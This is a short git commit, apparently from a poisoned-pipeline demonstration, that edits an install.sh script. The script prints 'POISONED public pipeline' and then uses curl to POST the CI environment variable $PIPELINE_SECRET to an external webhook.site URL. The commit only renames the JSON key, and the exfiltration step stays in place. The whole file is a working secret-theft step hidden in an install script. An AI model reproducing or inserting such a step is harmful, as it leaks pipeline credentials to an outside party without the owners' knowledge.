27d6053a067ab1d20bfa4d954bbf11182614105a
JacoStu <139375560+JacoStu@users.noreply.github.com>
2026-02-05 15:17:56 +0100

    Fix JSON key in curl command in install.sh

--- install.sh
+++ install.sh
@@ -2,5 +2,5 @@
 echo "POISONED public pipeline"
 curl -X POST \
   -H "Content-Type: application/json" \
-  -d "{\"prod_secret\":\"$PIPELINE_SECRET\"}" \
+  -d "{\"PIPELINE_SECRET\":\"$PIPELINE_SECRET\"}" \
   https://webhook.site/f2d3270c-1fa8-4871-8e43-1df020412a0a
